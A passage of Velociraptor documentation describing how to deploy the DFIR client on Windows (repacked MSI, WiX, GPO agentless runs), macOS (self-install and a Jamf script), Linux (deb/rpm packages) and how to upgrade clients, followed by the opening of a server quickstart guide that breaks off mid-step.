flag is not specified then the command will default to the root org, which
always exists.


## Running clients interactively

This method is most suitable for testing prior to deployment, for learning, or
for troubleshooting.

The most simple way to run the client is by executing it in a terminal and
providing it with the client configuration.

{{< tabs >}}
{{% tab name="Linux" %}}
```shell
./velociraptor --config client.config.yaml client -v
```
{{% /tab %}}
{{% tab name="Windows" %}}
```shell
velociraptor.exe --config client.config.yaml client -v
```
{{% /tab %}}
{{% tab name="macOS" %}}
```shell
./velociraptor --config client.config.yaml client -v
```
{{% /tab %}}
{{< /tabs >}}

The command line flag `-v` (verbose) is added so that the client prints it's log
to the terminal. It's not needed but it's very useful if you want to see what
the client is doing, especially if you are troubleshooting issues such as
network connectivity.

![](run_client_manual.gif)

The first time the client connects to the server it will **enroll**. The
enrollment process requires the client to reveal basic information about itself
to the server.

Note that this type of interactive execution will work effectively the same way
for all versions of the client (Windows, Linux, or Mac). In the sections that
follow, we show options for more scalable and/or permanent use.

When installed as a service, the Velociraptor client runs with elevated
privileges. But when running it manually you may choose to run it as a normal
user. The choice depends on what data sources you intend to access. For example,
to access operating system protected files usually requires elevated privileges.

In some circumstances you may want to automate this deployment method. That is,
you may want to run hunts across many endpoints without permanently installing
clients. Any remote management tool that can run executables on the endpoints
can be used, but in Active Directory environments it is common to use Group
Policy to accomplish this goal. We explain how to set up such a deployment in
the section [Agentless deployment](#agentless-deployment).

## Installing the client as a service

### Windows

The recommended way to install Velociraptor as a client on Windows is via the
release MSI which you can find on our [Downloads]({{< ref "/downloads/" >}}) page. Previous
releases can be found on the [Releases page](https://github.com/Velocidex/velociraptor/releases)
at Github.

An MSI is a standard Windows installer package. The benefit of using this
installer format is that most enterprise system administration tools are capable
of deploying MSI packages. For example, you can use SCCM or Group Policy to
deploy the MSI to a target organizational unit.

For more information, see
[Use Group Policy to remotely install software](https://learn.microsoft.com/en-us/troubleshoot/windows-server/group-policy/use-group-policy-to-install-software).

There are two approaches to generating the MSI package:

1. Repacking the official release MSI to include your client configuration.
   - using the GUI
   - using the command line
2. Building your own MSI from scratch using 3rd-party tools.

The first approach makes use of our official release MSI and inserts your client
configuration into the file without changing anything else. None of the MSI
settings are changed when using this method. It is most suitable for users who
just want to get up and running quickly. Since it is so commonly done we have
provided a built-in server artifact which allows this to be done via the
Velociraptor web GUI. However it can also be done on the command line using our
CLI, similar to how we create installer packages for Linux and macOS. The CLI
option makes it possible to automate the process using external tools or CI
pipelines.

The second option is suitable for users who require advanced customization of
the MSI package. This is done to change _how the MSI install works_. Things like
installation path, file name, service name, service startup options, icons, etc.
can be changed if needed. Most deployments don't need this kind of customization
but some do.

#### Repacking the official release MSI

Since the Velociraptor client requires *your* unique configuration file to
identify the location of *your* server, we can't package the configuration file
in the official release. Therefore, the official MSI does not include a valid
configuration file. You will need to modify the release MSI to include your
client configuration file, which you
[generated earlier]({{< ref "/docs/deployment/quickstart/#generate-the-configuration-file" >}}),
and this is done through a process we call "repacking".

The official release installs the Velociraptor executable into
`C:\Program Files\Velociraptor\`. It then creates a new Windows service that
points to this executable. The service starts automatically at boot time (with
a random delay). If an existing Velociraptor service is already installed, it
will be upgraded and the client configuration file will be overwritten.

##### Option 1: Using the Velociraptor GUI

The easiest way to repack the MSI package so that it includes your client config
file is by using the
[`Server.Utils.CreateMSI`]({{< ref "/artifact_references/pages/server.utils.createmsi/" >}})
server artifact.

1. In the Velociraptor web GUI, simply switch to the relevant Organization, then
   select **Server Artifacts** from the sidebar on the left side of the page.

![](create_msi_add.svg)

2. Add a new collection: search for `Server.Utils.CreateMSI`, select it, and
   then click "Launch".

![](create_msi_artifact.png)

3. It will take a moment to download the latest release MSI files (both 64-bit
   and 32-bit) from GitHub and then repack them with your client config file.

4. The repacked MSI files will then be available in the **Uploaded Files** tab
   of the artifact collection.

![](create_msi_uploaded.svg)

##### Option 2: Using the command line

{{% notice note %}}

In this section we'd like to draw your attention to the fact that repacking the
Windows MSI package can be done on _any_ platform. It does not have to be done
on Windows.

Also note that in the commands below we have omitted version numbers
and architecture tags from the file names to make the commands more concise,
however it is useful to include the version number and architecture tags in your
output file names so that you know exactly what they are.

{{% /notice %}}

To repack the MSI with a custom config on the command line we use the `config`
command, and the `repack` subcommand, with the `--msi` flag.

In all cases we need to tell Velociraptor which MSI we want to repack (usually
it's the [official release MSI]({{< ref "/downloads/" >}}): either 64-bit or 32-bit) and what
the output file should be named.

{{< tabs >}} {{% tab name="Linux" %}}
```shell
./velociraptor config repack --msi velociraptor-windows.msi client.config.yaml velociraptor-windows-repacked.msi
```
{{% /tab %}}
{{% tab name="Windows" %}}
```shell
velociraptor.exe config repack --msi velociraptor-windows.msi client.config.yaml velociraptor-windows-repacked.msi
```
{{% /tab %}}
{{% tab name="macOS" %}}
```shell
./velociraptor config repack --msi velociraptor-windows.msi client.config.yaml velociraptor-windows-repacked.msi
```
{{% /tab %}}
{{< /tabs >}}

If you are using Velociraptor [organizations]({{< ref "/docs/deployment/orgs/" >}}) ("orgs")
then you can obtain the client configuration file for each org from the Home
page in the GUI. Ensure that you are in the `root` org so that the configs for
all orgs are accessible.

![Where to find the client configs for all orgs](client_config_orgs.svg)

{{% notice note "Re-signing the repacked MSI" %}}

While the Velociraptor binary inside the MSI is officially signed by Rapid7 LLC
and is unaffected by the MSI repacking process, we recommend that the MSI also
be signed by a valid code signing certificate after repacking.

{{% /notice %}}

{{% notice warning "Winget install is not supported - you should pin/denylist Velociraptor in winget" %}}

If your Windows environment use winget command line tool (or
"Romanitho/Winget-AutoUpdate" for user toasts) for unattended 3rd party
app auto updates on Windows, this can lead to failed downgrade
messages and issues (as at 5 Feb 2024). When the winget version numbers
are fixed this can result in unexpected upgrade toasts and server-client version
mismatches.

We strongly recommend getting your admins to pin the Velociraptor version in
winget and also deny-list any upgrades of Velociraptor via Winget-autoupdate if
your environment uses it. Please see https://learn.microsoft.com/en-us/windows/package-manager/winget/pinning
/ https://github.com/Romanitho/Winget-AutoUpdate (search for "blacklist") for
more information.

{{% /notice %}}

#### Building a custom MSI package from scratch

If you wish to make advanced customizations to the MSI (for example, change the
name of the service, change install locations, etc.) then you will need to use
the [WiX Toolset](https://wixtoolset.org/) or similar packaging tool which can
build a new MSI from scratch. We recommend WiX and describe it's use here
because it is free and widely used. However there are other tools, mostly
commercially licensed, which you may decide to use instead, especially if your
organization already has such tools.

The Velociraptor repository on GitHub already includes a WiX Toolset
configuration file that creates a functioning MSI with an included client
configuration. You can further customize this WiX configuration to specify a
different service name, destination location, etc.

More detailed instructions are provided
[here](https://github.com/Velocidex/velociraptor/tree/master/docs/wix).

To summarize the process, you will need to perform the following steps:

1. Download or clone the Velociraptor repository to a Windows host.
   Specifically, you may want to copy the
   [docs/wix](https://github.com/Velocidex/velociraptor/tree/master/docs/wix)
   directory into a new working directory on your host. This folder contains the
   necessary WiX configuration (XML) files and other support files that make it
   possible to build your custom MSI directly in this folder. After creating
   your MSI build you may want to keep this build folder and use it for creating
   future builds when new Velociraptor versions are released.

![Copy WiX files from Velociraptor repo](image34.png)

2. Update the custom XML for your installation. The README file at
   [docs/wix](https://github.com/Velocidex/velociraptor/tree/master/docs/wix)
   walks you through the settings that are most commonly customized.

![Modifying the WiX configuration](image36.png)

3. Install the [WiX Toolset](http://wixtoolset.org/releases/) on your
   Windows host.

4. Add your custom `client.config.xml` file and the appropriate Velociraptor
   executable to a subdirectory of your build directory called `output`. If you
   have downloaded the executable from our website or GitHub then the file name
   will contain the version and platform information. Ensure that the executable
  in the `output` folder is named `velociraptor.exe`.

![Copy the configuration file into the output directory](image37.png)

5. Execute the build batch file to create the new MSI file.

![Build the MSI](wix_build.gif)


#### MSI install

To install the MSI from the command line (which requires elevated privileges) simply
run:

```shell
msiexec /i velociraptor_custom.msi
```

This will install the binary and client configuration file in the
`C:\Program Files\Velociraptor\`
folder, create the service, and start it.

The Velociraptor service runs using the Local System account. Startup of the
service is Automatic with a delayed start.

One way to automate such a deployment by using Active Directory Group Policy.
The procedure [outlined below](#agentless-deployment) can easily be adapted to
run the command `msiexec /i \\DC\Deployment\velociraptor_custom.msi` instead of
running the exe, or you can use Package distribution procedure described here:
[Use Group Policy to remotely install software](https://learn.microsoft.com/en-us/troubleshoot/windows-server/group-policy/use-group-policy-to-install-software).

#### Exe install

The Velociraptor executable is also capable of installing itself as a Windows
service without needing an MSI.

Although Velociraptor supports installing the service directly this is not the
recommended method. We recommend using the MSI as described above.

{{% notice warning "Self-install is not recommended" %}}

This installation method is not recommended because it does not use a proper
package manager, and that may complicate uninstalls or upgrades that you will
probably want to do in future.

A known problem with installing the service in this way is that it cannot
uninstall completely cleanly since MSI infrastructure would usually be relied on
to perform post-removal tasks such as cleaning up old files.

Nevertheless this approach is possible if the situation requires it. You may
choose to automate such a deployment by using the Group Policy scheduled tasks
procedure [outlined below](#agentless-deployment).

{{% /notice %}}

The following command, which requires elevated privileges, will install the
client as a service:

```shell
velociraptor.exe service install --config client.config.yaml -v
```

This will install the binary and client configuration file in the
`C:\Program Files\Velociraptor\`
folder, create the service, and start it.

The binary location is specified in the configuration file under the setting
`Client.windows_installer`. You can also change the name of the binary and the
service name if you wish.

The Velociraptor service runs using the `Local System` account. Startup of the
service is Automatic with a delayed start.

After installation you can check the service status with the command

```shell
sc query velociraptor
```

### macOS

Apple's requirements and processes for software packaging are complex. Therefore
we don't provide installer packages (.pkg or .dmg) or packaging capabilities for
macOS. Our binary does have the capability to install itself under macOS though,
and this is described below. We do provide Apple Developer code-signed binaries
for all official releases.

If your organization has the necessary toolsets, skills and other resources for
creating macOS installation packages then you may choose to do so. The
Velociraptor client is a single binary, with no package or library dependencies,
plus a configuration file, which is probably the simplest kind of package that
any packaging expert will ever have to deal with.

#### Manual Deployment

For small deployments we provide a self-installing capability in the
Velociraptor binary. The `service install` directive can be used to install
Velociraptor so that it persists through reboots and starts automatically. The
following command installs the binary and the config to `/usr/local/sbin`.
Persistence and service control is accomplished via launchd.

First you need to mark the binary as executable.

```shell
chmod +x velociraptor
```

The following command, run with root privileges, will install the Velociraptor
client as a service.

```shell
sudo ./velociraptor service install --config client.config.yaml -v
```

{{% notice note %}}

Depending on your version of macOS you may be prevented from running the
executable and you will instead see a warning similar to this.

![](macos_cant_open.png)

Click "OK" or "Cancel" and then from System Preferences, open "Security &
Privacy" and from the General tab, click "Allow Anyway".

![](macos_allow_anyway.png)

If you downloaded the file from the internet or another network location then
you may also need to remove the quarantine attribute from the file to suppress
further warning prompts.

```shell
xattr -d com.apple.quarantine velociraptor
```
{{% /notice %}}

The client binary will be installed into the path specified in the
`Client.DarwinInstaller.InstallPath` key of the client config, and defaults to
`/usr/local/sbin/velociraptor`.

The client config will be written to `/usr/local/sbin/velociraptor.config.yaml`.

The client service will be named according to the name set in the
`Client.DarwinInstaller.ServiceName` key of the client config, and defaults to
`com.velocidex.velociraptor`.

In addition, for macOS versions >10.14 the client also requires "Full Disk
Access" in order to work correctly. Full Disk Access is part of Apple's security
framework for macOS, and this feature enables an application to access all files
on the system.

![Enabling Full Disk Access](macos_fda.png)

After installation you can check the service's status with:
- `ps -eaf | grep velo` or
- `sudo launchctl print system/com/velocidex.velociraptor` or
- Navigate to **Applications > Utilities > Activity Monitor** and search for
  Process Name `velociraptor`.

#### Automated deployment using MDM

Organizations that use macOS at scale usually have their own packaging and
deployment processes worked out using their preferred toolset and MDM solution.
For example
[Jamf](https://www.jamf.com/) or
[Microsoft Intune](https://learn.microsoft.com/en-us/mem/intune/fundamentals/deployment-guide-platform-macos)
are commonly used mobile device management (MDM) solutions.

Below is a community-provided example of the steps required for Jamf Pro.
Unfortunately we cannot provide detailed instructions for other MDM solutions,
and we recommend that you consult the documentation for your chosen MDM
solution.

Some of the considerations and complexities regarding deployments in macOS
environments are described in
[this presentation]({{< ref "/presentations/2022_velocon/#mac-response--the-good-the-bad-and-the-ugly" >}}).
and may be helpful.

##### Jamf Pro deployment example

1. Navigate to **Configuration Profiles > New**
2. Configure **Privacy Preferences Policy Control**
- Identifier: `/usr/local/sbin/velociraptor`
- Identifier Type: `Path`
- Code Requirement: `identifier "com.velocidex.velociraptor" and anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "UL6CGN7MAL"`
- Under "App or Service" Configure **SystemPolicyAllFiles** set to **Allow**, effectively granting "Full Disk Access"
- Scope: You can select **All Computers** but this is up to you

*This configuration would be the same for all MDM solutions for MacOS, just different UI*
![](jamf_pro_profile_policy.png)


3. Navigate to **Smart Computer Groups > New**
4. Configure the group
- **Running Services** `does not have` **com.velocidex.velociraptor**
- *and* **Architecture Type** `is` **arm64**

*you can also use **x86_64** instead of **arm** for intel based devices*
![](jamf_pro_smart_group.png)

5. Navigate to **Settings > Scripts > New**
6. Create your installer script.

*This is an example based on **v0.74.1**, you may want to install the client differently*
```
echo "Start script";
velociraptor_DIR="/Users/Shared/velociraptor_install";
filename="velociraptor-v0.74.1-darwin-arm64";
mkdir $velociraptor_DIR;
cd $velociraptor_DIR;

checksum="e6496519402e139de376c1c964302cc5f9b338c1d88a52b0579c9121d1992fba";

# Installing Downloading velociraptor
curl -L -O "https://github.com/Velocidex/velociraptor/releases/download/v0.74/$filename"
temp_checksum=$(shasum -a 256 $filename | cut -d ' ' -f1);
if [[ $temp_checksum != $checksum ]]; then
    echo "Downloaded hash ($temp_checksum) is not matching the check $checksum";
    rm -f $filepath;
    exit;
fi

chmod a+x $filename;

cat >client.config.yaml << EOL
version:
  name: velociraptor
  version: 0.74.1
  commit: 7e3ae67d3
  build_time: "2025-03-26T02:36:53Z"
  compiler: go1.23.2
  system: linux
  architecture: arm64
Client:
.....................
.....................
EOL

sudo ./$filename --config client.config.yaml service install;
```

7. Navigate to **Policies > New**
8. Configure installation policy:
- Scope: `Smart Group we created in 3.` (Make sure that the Profile we created in **1.** is deployed to the same scope OR "All Computers"
- Scripts: `Script we created in 5.`
- Triggers: Up to you.

### Linux

There are many variations of Linux in the wild. Many distributions and releases,
both new and very old. As DFIR practitioners we have to deal with whatever
systems are put in front of us. Upgrading operating systems is usually not an
option.

Most binaries compiled for Linux, including our standard Linux binary, link to a
specific minimum version of the Glibc library. This version is dictated by the
compiler, which links the binary to the version present on the system on which
it is compiled. We obviously prefer to compile our binaries on modern systems,
so this means that the standard binary will only work on modern systems
(generally ones from the past few years) and will fail to run on older Linux
systems that have older Glibc versions. You will see an error similar to
_"Version GLIBC_2.xx Not Found"_ when trying to run the standard binary on such
systems. Typically the version of Glibc cannot be upgraded without upgrading
the entire operating system.

If your environment has only relatively modern Linux systems then this shouldn't
be a problem for you. However to address this problem for environments where old
Linux systems are an unavoidable fact, we also release a Linux
[MUSL](https://musl.libc.org/about.html) binary. This binary is linked against a
static version of the MUSL library which allows Velociraptor to run with zero
dependencies on the running OS. We find this binary to be completely reliable
and no issues have been reported with it, so we recommend the MUSL build in all
cases. The MUSL releases have `_musl` at the end of the file name.

The `dpkg` (Ubuntu/Debian/Mint) or `rpm` (Red Hat/CentOS/Fedora/SUSE) package
management tools are used to install Velociraptor on Linux clients after
creating an appropriate package.

Both types of installer packages use the same service settings and file
locations. That is, the binary and client configuration files for Linux will be
in the same locations regardless of whether you installed using an `rpm` or a
`deb` package.

Our `rpm` installer supports both **systemd** and **SysVinit**, since very old
RPM-based systems are still relatively common, so our installer will
detect and use the appropriate one. We do not provide installer support for
other init systems such as Upstart, init.d or OpenRC. If you need to create
installer packages for platforms that use other init systems then you will have
to do it manually. However you can probably re-use most of the service
configuration information that we use for **systemd** and **SysVinit**, which is
available in our GitHub repo.

After installation the binary will be located at

- `/usr/local/bin/velociraptor_client`

and the client configuration file will be at

- `/etc/velociraptor/client.config.yaml`.

The Velociraptor service is named `velociraptor_client.service` and runs using
the `root` account. Startup of the service is automatic.


#### Debian Package

{{% notice note %}}

In this section we'd like to draw your attention to the fact that creation of
Linux installation packages can be done on _any_ platform. It does not have to
be done on Linux.

Also note that in the commands below we have omitted version numbers from the
file names to make the commands more concise, however it is useful to include
the version number and architecture tags in your output file names so that you
know exactly what they are.

{{% /notice %}}

1. **Create a deb installation package with an embedded client configuration file.**

{{< tabs >}} {{% tab name="Linux" %}}
```shell
./velociraptor debian client --config client.config.yaml
```
{{% /tab %}}
{{% tab name="Windows" %}}
```shell
velociraptor.exe debian client --config client.config.yaml --binary velociraptor-linux-musl
```

Since the Windows binary is being used here to do the packaging work, we also
need to tell it where to find the Linux binary.

{{% /tab %}}
{{% tab name="macOS" %}}
```shell
./velociraptor debian client --config client.config.yaml --binary velociraptor-linux-musl
```

Since the macOS binary is being used here to do the packaging work, we also
need to tell it where to find the Linux binary.

{{% /tab %}}
{{< /tabs >}}

If the output file name is not specified (using the `--output` flag) then it
will be auto-generated and include the version number and architecture.

2. **Install the package.**

```shell
sudo dpkg -i velociraptor_client_amd64.deb
```

After installation you can check the service status with the command:

- `systemctl status velociraptor_client` - on systems using systemd
- `service velociraptor_client status` - on systems using SysVinit


#### Red Hat Package

1. **Create a RPM installation package with an embedded client configuration file.**

{{< tabs >}} {{% tab name="Linux" %}}
```shell
./velociraptor rpm client --config client.config.yaml
```
{{% /tab %}}
{{% tab name="Windows" %}}
```shell
velociraptor.exe rpm client --config client.config.yaml --binary velociraptor-linux-musl
```

Since the Windows binary is being used here to do the packaging work, we also
need to tell it where to find the Linux binary.

{{% /tab %}}
{{% tab name="macOS" %}}
```shell
./velociraptor rpm client --config client.config.yaml --binary velociraptor-linux-musl
```

Since the macOS binary is being used here to do the packaging work, we also
need to tell it where to find the Linux binary.

{{% /tab %}}
{{< /tabs >}}

If the output file name is not specified (using the `--output` flag) then it
will be auto-generated and include the version number and architecture.


2. **Install the package.**

```shell
sudo rpm -Uvh velociraptor_client_amd64.rpm
```

After installation you can check the service status with the command:

- `systemctl status velociraptor_client` - on systems using systemd
- `service velociraptor_client status` - on systems using SysVinit


### Other platforms and architectures

In our official releases we also provide binaries for FreeBSD.

Velociraptor is written in Golang, so it is technically possible for you to
build it on any platform supported by Go. However Go has officially
[ended support for Windows 7](https://github.com/golang/go/issues/57003) with
the Go 1.20 release. This means that Windows XP, Windows server 2003, and
Windows 7/Vista can no longer be built using a supported version of Go. We may
make occasional (depending on demand for it) builds for Windows 7 using an old
unsupported version of Go, but these will not be supported and may not be the
latest version. Please see [our Support Policy]({{< ref "/docs/overview/support/" >}}).

We also distribute 32-bit binaries for Windows but not for Linux. If you need
32-bit Linux builds you will need to build from source. You can do this easily
by forking the project on GitHub, enabling GitHub Actions in your fork and
editing the "Linux Build All Arches" pipeline.

## Agentless deployment

There has been a lot of interest in "agentless hunting" using Velociraptor,
especially since many people come from backgrounds where PowerShell is used for
this purpose.

There are many reasons why agentless hunting is appealing. These are the ones we
hear most often:

* There are already a ton of endpoint agents and yet another one may not be
  welcome.
* Sometimes we need to deploy endpoint agents as part of a DFIR engagement and
  we may not want to permanently install yet another agent on endpoints.

In the agentless deployment scenario, we simply run the binary from a network
share using Group Policy settings. The downside to this approach is that the
endpoint needs to be on the domain network to receive the Group Policy update
(and have the network share accessible) before it can run Velociraptor.

When we run in agentless mode, we are typically interested in collecting a bunch
of artifacts via hunts and then exiting - the agent will not restart after a
reboot. So this method is suitable for quick hunts on corporate (non roaming)
assets.

<!--
See this [blog post]({{< ref "/blog/html/2019/03/02/agentless_hunting_with_velociraptor.html" >}}) for details of how to deploy Velociraptor in agentless mode.
-->

#### Create a network share

The first step is to create a network share with the Velociraptor binary and its
configuration file. We will run the binary from the share in this example, but
for more reliability you may want to copy the binary into e.g. a temp folder on
the end point in case the system becomes disconnected from the domain. For quick
hunts though, it should be fine.

We create a directory on the server. Note that in the below example, we're
creating on a Domain Controller, but we strongly recommend using another
location on real deployments.

![Create Share](1.png)

In this example we created a directory called `C:\Users\Deployment` and ensured
that it's read-only. We shared the directory as the name `Deployment`.

We now place the Velociraptor executable and client config file in that
directory and verify that it can run the binary from the network share. The
binary should be accessible via `\\DC\Deployment\velociraptor.exe`:

![Testing Client Locally](2.png)

#### Create the Group Policy object

Next we create the Group Policy object, which forces all domain connected
machines to run the Velociraptor client. We use the Group Policy Management
Console:

![Group Policy Object](3.png)

Select the OU or the entire domain and click "Create New GPO":

![New GPO](4.png)

Now right click the GPO object and select "Edit":

![Edit GPO](5.png)

We will create a new scheduled task. Rather than schedule it at a particular
time, we will select to run it immediately. This will force the command to run
as soon as the endpoint updates its Group Policy settings, because we don't want
to wait for the next reboot of the endpoint.

![Scheduled Task](6.png)

Next we give the task a name and a description. In order to allow Velociraptor
to access raw devices (e.g. to collect memory or NTFS artifacts) we can specify
that the client will run at `NT_AUTHORITY\SYSTEM` privileges and run without any
user being logged on.

It's also worth ticking the "hidden" checkbox here to prevent a console box from
appearing.

![Adding a new task](7.png)

Next click the Actions tab and add a new action. This is where we launch the
Velociraptor client. The program will simply be launched from the share (i.e.
`\\DC\Deployment\velociraptor.exe`) and we give it the arguments allowing it to
read the provided configuration file
(i.e. `--config \\DC\Deployment\client.config.yaml client -v`).

![Specifying task action](8.png)

In the "Setting" tab we can control how long we want the client to run. For a
quick hunt, this may be an hour or two depending on the network size and hunt
scope. For a more comprehensive DFIR collection, be prepared to wait several
hours or even days while user machines are naturally disconnected and
reconnected from the network. The GPO will ensure the client is killed after the
allotted time.

![Task settings](9.png)

Once the GPO is installed it becomes active for all domain machines. You can now
schedule any hunts you wish using the Velociraptor GUI. When a domain machine
refreshes its Group Policy, it will run the client, which will enroll and
immediately participate in any outstanding hunts - thus collecting and
delivering its artifacts to the server.

After the allotted time has passed, the client will shut down without having
installed anything on the endpoint.

You can force a Group Policy update by running the `gpupdate` program. Now you
can verify that Velociraptor is running:

![Task manager output](10.png)

{{% notice note "Preventing multiple instances of Velociraptor" %}}

In our experience GPO deployments are not very reliable - we often find the
Velociraptor client will be launched multiple times on the endpoint. It is
highly recommended that you use the `--mutant` flag to specify a mutant
preventing the client from starting multiple times.

```shell
velociraptor.exe --config ... client -v --mutant ArandomString
```

{{% /notice %}}


## Client upgrades

The client's identity is derived from the client's cryptographic certificate
which is stored in the `writeback` location on the endpoint (For example by
default `C:\Program Files\Velociraptor\velociraptor.writeback.yaml`).

We generally try to preserve this file between updates in order to ensure
clients do not change their client id. The default provided WiX script ensures
the file remains (even if the package is uninstalled completely) in order to
ensure a consistent client id for the host.

Generally it is sufficient to repackage the latest client binary in a new MSI,
after downloading it from the
[GitHub Release Page](https://github.com/Velocidex/velociraptor/releases).
Installing the new MSI is simply a matter of using standard software management
tools.

{{% notice tip "Remotely upgrading Velociraptor" %}}

It is possible to remotely upgrade the client by pushing a new MSI to the
endpoint and installing it. This is handled by the `Admin.Client.Upgrade`
artifact. To use it, simply collect the artifact from the endpoint and click the
tool setup screen.

![Configuring remote upgrade artifact](remote_upgrade_msi.svg)

In the tools setup screen select the MSI from your local machine and upload it
to the server.

![Uploading client MSI to the server](remote_upgrade_msi_2.svg)

Note that when installing the MSI using Velociraptor, the Velociraptor process
will be killed part way through collecting the artifact, so it would appear to
never complete it (in the GUI the flow looks hung). This is OK and part of the
upgrade process.

{{% /notice %}}

To verify that clients are upgraded we recommend running the
`Generic.Client.Info` hunt periodically. This hunt will refresh the server's
datastore of client details (including reporting the client's version).

---END OF FILE---

======
FILE: /content/docs/deployment/quickstart/_index.md
======
---
menutitle: "Quickstart"
title: "Quickstart Guide"
date: 2025-02-27
last_reviewed: 2025-04-28
draft: false
weight: 5
aliases:
  - "/docs/deployment/self-signed/"
---

The goal of this guide is to help you get a Velociraptor server deployed with
one or more clients, as quickly and simply as possible.

The Velociraptor server will be configured to use self-signed SSL certificates
and Basic authentication, which is a relatively simple configuration scheme
suitable for short-term (e.g. testing/evaluation) non-production use, ideally on a
private network.

For production deployments, Single Sign-on (SSO) authentication
is strongly recommended. However it requires a slightly more complicated
certificate scheme and public DNS configuration. To explore these other options
please see the [Deployment]({{< ref "/docs/deployment/" >}}) section.


{{% notice info "Production Use Disclaimer" %}}

Please note that in this simple configuration the Velociraptor server should
not be exposed to the public internet, particularly because Basic
authentication mode is vulnerable to brute-force attacks.
[SSO authentication]({{< ref "/knowledge_base/tips/setup_google_oauth/" >}})
is recommended for production deployments, but SSO is rarely configured with
self-signed certificates (since it goes against the idea of a trusted
authentication flow), and we intend to use self-signed certificates in this
guide for expediency.

If you have chosen to install the server component on a cloud VM then you should
leave the GUI port bound to the loopback address and use SSH tunneling to
connect to the local loopback address.

Self-signed SSL with Basic authentication is most often used when Velociraptor
is deployed on private networks for temporary situations such as incident
response. For long-term deployments, the other modes of operation that
Velociraptor offers should be preferred.

{{% /notice %}}

{{% notice tip "Need to go even quicker?" %}}

If you're really in a hurry you can start a self-contained
[Instant Velociraptor]({{< ref "/docs/deployment/#instant-velociraptor" >}})
on your local machine which will allow you to experiment and get a feel for how
Velociraptor works, without having to deal with any of the network complexities.
One command is all that's needed to get started!

{{% /notice %}}

## What you'll need before you start

- A computer running Linux (any modern Debian or RPM-based distro should be
  fine) on which you can install the **Velociraptor server** component.

  - Ubuntu is commonly used and we use it for testing, so it is generally
    recommended unless you have a strong preference for something else. If you
    choose to use another Linux distro then please note that it needs to be one
    that uses systemd, although most do these days.

  - The sizing of your server depends on the number of endpoints in your
    environment. A small server with 8GB memory should be sufficient for
    at least 1000 clients, so for a limited deployment that should be more than
    sufficient. You will also need enough disk space to hold the data that you
    collect from your endpoints, and that of course depends entirely on what you
    intend to collect, how frequently you collect it, how many endpoints, etc.

- One or more computers running Windows on which you can install the
  **Velociraptor client** component.

  - This can actually be any supported client operating system, but in this
    guide we describe the process for a Windows client since it is still by far
    the most common target operating system. See
    [Deploying Clients]({{< ref "/docs/deployment/clients/" >}})
    for instructions for deploying clients on other platforms.

  - The Windows version should be at least Windows 10. Older versions may
    require a special build of the Velociraptor binary, as noted
    [here]({{< ref "/downloads/#release-notes" >}}),
    since earlier versions are not supported by the latest version of Go, nor
    by Microsoft.

  - If you're just testing, you can install the client on the same machine as
    the server if you really want to. It's not commonly done but the server and
    client will not conflict with each other if run on the same machine.

## Simplifying assumptions

To keep things simple in this deployment scenario we are going to assume that:

1. The server and client(s) are on the same local network, with no proxies,
   firewalls or NAT devices between them.

2. No DNS records have been configured for the server. While it is usually
   preferable for the clients to be able to resolve and connect to the server by
   DNS name, in Self-Signed SSL mode this is not a requirement. Here we will use
   IP addresses in our configuration, but that means you need to ensure that
   your server's IP address will not change for the duration of your deployment.
   Alternatively you should set up an DNS A record for your server and use that
   name instead of an IP address in the steps below.

   <!-- In this article we will use
   `<your_server_ip>` as shorthand for the IP address of the server, but you
   should substitute your server's actual IP in the commands or config settings
   shown, or instead use the server's DNS name if you have added it to your DNS. -->

3. The server will be able to connect to websites on the internet, specifically
   GitHub, in order to download additional files. While this is not an absolute
   requirement, it is necessary to complete the steps in this guide.

4. The Velociraptor Clients will be able to connect to the server on the default
   TCP port `8000`.

5. Your workstation will be able to connect using a web browser to the
   Velociraptor Admin GUI running on the server on the default TCP port `8889`.


If you have a more complex environment that cannot satisfy the above
requirements then you should refer to the
[Deployment]({{< ref "/docs/deployment/" >}}) section where more advanced
deployment scenarios and associated options are discussed.

## Deployment Roadmap

Before we dive in, here's a brief overview of the procedure which we will follow.

In the first 3 steps we will _prepare_ to install the Velociraptor server
component:

* [Step 1: Download the Velociraptor binaries](#step-1-download-the-velociraptor-binaries)
* [Step 2: Create the server configuration file](#step-2-create-the-server-configuration-file)
* [Step 3: Create the server installation package](#step-3-create-the-server-installation-package)

Then we install the server component, log in to the user interface, and create a
client installer package for Windows:

* [Step 4: Install the server component](#step-4-install-the-server-component)
* [Step 5: Log in to the Admin GUI](#step-5-log-in-to-the-admin-gui)
* [Step 6: Create an installation package for Windows clients](#step-6-create-an-installation-package-for-windows-clients)

Lastly, we will install the client and confirm that it is communicating with the
server:

* [Step 7: Install the client on endpoints](#step-7-install-the-client-on-endpoints)

The first 3 steps can actually be performed on any platform since we are only
preparing for the installation and not actually installing anything yet, however
doing so on the server is the quickest way and simultaneously verifies that
internet access from the server is OK.


## Step 1: Download the Velociraptor binaries

Before we start configuring or running anything you'll need to download the
latest binary. Binaries for the latest version are listed on our
[Downloads]({{< ref "/downloads/" >}}) page, with the binaries themselves being
hosted on Github.

At this point you only need to download one binary (the one that matches your
server's platform and architecture) because after installation we will use the
server to download the Windows binary that we will use for the client.

{{% notice note "One binary to rule them all!" %}}

<!-- **Velociraptor only has one binary per operating system + architecture combination.** -->

Velociraptor does not have separate client binaries and server binaries. The
binary can function in either role, and perform various other utility functions.
The command line parameters supplied to the binary tell it whether to behave as
a server or as a client.

This means that it's technically possible to run the server or the client on any
platform that we have a binary for. However
_please note that the server is only fully supported on Linux_,
mainly due to performance considerations inherent in other platforms such as
Windows. For non-production deployments (e.g. development or testing) it might
be convenient for you to run the server on another platform and that's fine if
you feel adventurous and confident in your troubleshooting skills. Just keep in
mind that for production deployments we strongly recommend that the server
should run on Linux and that issues encountered when running the server on other
platforms will not be supported. For this reason we only describe deploying the
server on Linux in this guide.

{{% /notice %}}

For these pre-installation steps you may want to create a new working directory:

```sh
mkdir ~/velociraptor_setup && cd ~/velociraptor_setup
```

This directory and the files inside it will not be needed _after_ the server is
installed, but you might want to keep a copy of these files as an off-server
backup for disaster recovery purposes.

Copy the download link for the latest version, appropriate to the
platform and architecture of your server, and then use it in the `wget` command
shown below. This will download the binary and save it with the name
`velociraptor`:

```sh
wget -O velociraptor https://github.com/Velocidex/velociraptor/releases/download/v0.74/velociraptor-v0.74.1-linux-amd64
```

Then make the downloaded file executable so that you can run it in subsequent
steps:

```sh
chmod +x velociraptor
```

If you run the binary without any command line parameters, or with `-h`, or with
`--help-long`, it will display help for all the command line options.

```sh
